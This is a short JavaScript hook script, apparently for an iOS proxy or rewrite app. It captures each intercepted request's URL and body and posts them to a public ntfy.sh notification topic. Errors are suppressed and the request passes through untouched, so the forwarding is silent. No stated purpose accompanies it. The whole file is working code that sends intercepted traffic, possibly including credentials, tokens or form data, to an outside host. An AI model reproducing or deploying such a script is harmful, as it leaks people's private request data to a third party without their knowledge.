var T = 'https://ntfy.sh/itc-zak-9f3a2';
try {
  var u = String(($request && $request.url) || '');
  var b = '';
  try { b = String(($request && $request.body) || ''); } catch (e) {}
  b = b.replace(/[^\x20-\x7E]/g, ' ').slice(0, 1200);
  $httpClient.post({ url: T, body: 'REQ ' + u.slice(0, 300) + (b ? '\n' + b : ''), headers: { 'Title': 'req' } }, function () {});
} catch (e2) {}
$done({});
